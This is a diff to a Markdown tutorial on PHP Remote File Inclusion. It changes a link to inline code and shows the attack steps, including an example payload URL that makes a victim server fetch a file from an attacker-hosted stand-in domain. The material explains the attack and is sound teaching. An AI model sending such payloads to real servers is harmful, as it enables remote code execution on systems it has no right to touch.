@@ -55,7 +55,7 @@ A requirement for RFI is that the `allow_url_fopen` option need to be `on`
 
 The risk of RFI is higher than that of LFI, as RFI can allow an attacker gain remote code execution on the server. The RFI process is roughly as follows:
 
-1. Attacker hosts malicious file ([site.com/bad_command.txt](http://site.com/bad_command.txt))
+1. Attacker hosts malicious file (`site.com/bad_command.txt`)
 2. Attacker sends a payload including the location of the bad file-
     1. e.g. `http://victim.com/get.php?file=http://site.com/bad_command.txt`
 3. The victim server retrieves the malicious file which is being hosted by the attacker
